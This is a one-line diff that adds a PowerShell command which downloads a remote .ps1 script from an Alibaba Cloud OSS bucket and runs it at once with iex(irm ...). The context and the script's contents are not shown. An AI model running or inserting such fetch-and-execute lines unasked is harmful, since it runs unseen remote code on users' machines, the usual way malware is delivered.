@@ -1,0 +1,1 @@
+iex(irm 'https://xingqiong-oss.oss-cn-hangzhou.aliyuncs.com/pc/down/s_gf.ps1')
